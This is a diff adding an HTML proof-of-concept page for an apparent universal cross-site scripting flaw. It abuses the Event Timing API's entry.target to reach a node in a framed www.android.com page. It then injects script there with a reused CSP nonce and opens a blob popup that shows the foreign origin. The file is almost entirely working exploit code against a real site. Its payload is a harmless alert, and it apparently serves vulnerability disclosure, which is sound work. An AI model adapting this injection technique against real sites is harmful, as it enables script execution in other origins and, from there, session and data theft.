@@ -1,0 +1,224 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>poc_by_xzyhellsing — Google Event Timing UXSS</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font: 16px system-ui, sans-serif;
+    background: #101622;
+    color: #eef4ff;
+  }
+  header { padding: 14px 16px; background: #20345d; }
+  header strong { display: block; font-size: 19px; }
+  #instruction { display: block; margin-top: 4px; }
+  #log {
+    margin: 0;
+    padding: 12px 16px;
+    height: 16vh;
+    overflow: auto;
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+    color: #bfe0ff;
+  }
+  iframe {
+    display: block;
+    width: 50%;
+    height: 32vh;
+    margin-bottom: 32vh;
+    border: 2px solid #4e78c7;
+    background: white;
+    transform: scale(2);
+    transform-origin: left top;
+  }
+</style>
+<header>
+  <strong>poc_by_xzyhellsing — Google Event Timing UXSS</strong>
+  <span id="instruction">Tap once on the large Search icon inside the framed Android page below. No credentials or private data are accessed.</span>
+</header>
+<pre id="log"></pre>
+<iframe id="victim" name="xzyhellsing_google_event_timing_victim"></iframe>
+<script>
+(() => {
+  'use strict';
+
+  const GOOGLE_ORIGIN = 'https://www.android.com';
+  const targetUrl = `${GOOGLE_ORIGIN}/?xzyhellsing_event_timing=1`;
+  const logNode = document.querySelector('#log');
+  const seen = new WeakSet();
+  let attacked = false;
+
+  function log(message, data) {
+    const suffix = data === undefined ? '' : ` ${JSON.stringify(data)}`;
+    logNode.textContent += `${new Date().toISOString()} ${message}${suffix}\n`;
+    logNode.scrollTop = logNode.scrollHeight;
+  }
+
+  function attackForeignNode(node, entry) {
+    if (attacked || !node || seen.has(node)) return;
+    seen.add(node);
+
+    let owner;
+    try {
+      owner = node.ownerDocument;
+      log('EVENT_TIMING_TARGET_EXPOSED', {
+        entry: entry.name,
+        duration: entry.duration,
+        tag: node.nodeName,
+        sameDocument: owner === document,
+        ownerURL: owner && owner.URL
+      });
+    } catch (error) {
+      log('TARGET_WRAPPER_BLOCKED', {
+        name: error.name,
+        message: error.message
+      });
+      return;
+    }
+
+    if (!owner || owner === document) return;
+
+    attacked = true;
+    const payload = `(() => {
+      const report = detail => {
+        try {
+          parent.postMessage({xzyhellsingEventTiming: detail}, '*');
+        } catch (_) {}
+      };
+      report({stage: 'foreign-payload-started', origin: location.origin});
+      const foreignOrigin = location.origin;
+      const blockSiteAction = event => {
+        event.preventDefault();
+        event.stopImmediatePropagation();
+      };
+      for (const type of ['pointerdown', 'pointerup', 'click']) {
+        addEventListener(type, blockSiteAction, {capture: true, once: true});
+      }
+
+      document.documentElement.setAttribute('data-xzyhellsing-child-origin', foreignOrigin);
+
+      function topProof() {
+        const markerHost = document.createElement('div');
+        markerHost.id = 'poc_by_xzyhellsing';
+        markerHost.style.cssText = 'position:fixed!important;inset:0!important;z-index:2147483647!important;display:block!important;background:#101622!important;color:white!important;padding:32px!important;font:24px system-ui!important';
+        const markerRoot = markerHost.attachShadow({mode: 'closed'});
+        const heading = document.createElement('h1');
+        heading.textContent = 'poc_by_xzyhellsing';
+        const originProof = document.createElement('p');
+        originProof.id = 'foreign-origin';
+        originProof.textContent = location.origin;
+        const frameProof = document.createElement('p');
+        frameProof.id = 'top-state';
+        frameProof.textContent = 'top=' + String(top === self);
+        const modeProof = document.createElement('p');
+        modeProof.id = 'proof-mode';
+        modeProof.textContent = 'top-level blob promoted from genuine Android child';
+        markerRoot.append(heading, originProof, frameProof, modeProof);
+        (document.body || document.documentElement).appendChild(markerHost);
+        document.title = 'poc_by_xzyhellsing ' + location.origin;
+        focus();
+        alert(location.origin);
+      }
+
+      const popupName = 'xzyhellsing_android_top_' + Math.random().toString(36).slice(2);
+      const creatorNonce = document.querySelector('script[nonce]');
+      const nonce = creatorNonce && creatorNonce.nonce
+        ? creatorNonce.nonce.replace(/[&<>"']/g, '')
+        : '';
+      const proofHtml = '<!doctype html><meta charset="utf-8">' +
+        '<title>poc_by_xzyhellsing</title><body>' +
+        '<script' + (nonce ? ' nonce="' + nonce + '"' : '') + '>' +
+        '(' + topProof.toString() + ')()' +
+        '<\\/script>';
+      const blobUrl = URL.createObjectURL(new Blob(
+        [proofHtml],
+        {type: 'text/html'}
+      ));
+      const popup = window.open(blobUrl, popupName);
+      report({stage: popup ? 'popup-opened' : 'popup-blocked'});
+      if (!popup) return;
+      report({stage: 'blob-top-proof-opened', origin: foreignOrigin});
+    })()`;
+
+    try {
+      const script = owner.createElement('script');
+      const nonceSource = owner.querySelector('script[nonce]');
+      if (nonceSource && nonceSource.nonce) {
+        script.nonce = nonceSource.nonce;
+      }
+      script.textContent = payload;
+      (owner.head || owner.documentElement).appendChild(script);
+      log('FOREIGN_SCRIPT_APPENDED', {
+        ownerURL: owner.URL,
+        contentType: owner.contentType,
+        reusedNonce: Boolean(script.nonce)
+      });
+    } catch (error) {
+      log('FOREIGN_MUTATION_BLOCKED', {
+        name: error.name,
+        message: error.message
+      });
+    }
+  }
+
+  if (!('PerformanceObserver' in window)
+      || !PerformanceObserver.supportedEntryTypes.includes('event')) {
+    log('EVENT_TIMING_UNAVAILABLE', PerformanceObserver.supportedEntryTypes);
+  } else {
+    const observer = new PerformanceObserver(list => {
+      for (const entry of list.getEntries()) {
+        let target = null;
+        try {
+          target = entry.target;
+        } catch (error) {
+          log('TARGET_GETTER_THREW', {
+            name: error.name,
+            message: error.message
+          });
+        }
+        log('EVENT_TIMING_ENTRY', {
+          name: entry.name,
+          duration: entry.duration,
+          target: target ? target.nodeName : null
+        });
+        if (target) attackForeignNode(target, entry);
+      }
+    });
+    observer.observe({type: 'event', buffered: true, durationThreshold: 16});
+    log('EVENT_TIMING_OBSERVER_ARMED', {
+      attackerOrigin: location.origin,
+      targetOrigin: GOOGLE_ORIGIN
+    });
+  }
+
+  window.addEventListener('message', event => {
+    if (event.origin !== GOOGLE_ORIGIN
+        || event.source !== victim.contentWindow
+        || !event.data
+        || !event.data.xzyhellsingEventTiming) return;
+    log('FOREIGN_STAGE', event.data.xzyhellsingEventTiming);
+  });
+
+  function startStress() {
+    const stressDeadline = performance.now() + 30000;
+    const stressFrame = () => {
+      const sliceEnd = performance.now() + 24;
+      while (performance.now() < sliceEnd) {}
+      if (performance.now() < stressDeadline) {
+        requestAnimationFrame(stressFrame);
+      }
+    };
+    requestAnimationFrame(stressFrame);
+  }
+
+  const victim = document.querySelector('#victim');
+  victim.addEventListener('load', () => {
+    document.querySelector('#instruction').textContent =
+      'Target loaded — tap once near the top-right of the framed Android header.';
+    log('TARGET_LOADED', {targetUrl});
+    startStress();
+  }, {once: true});
+  victim.src = targetUrl;
+})();
+</script>
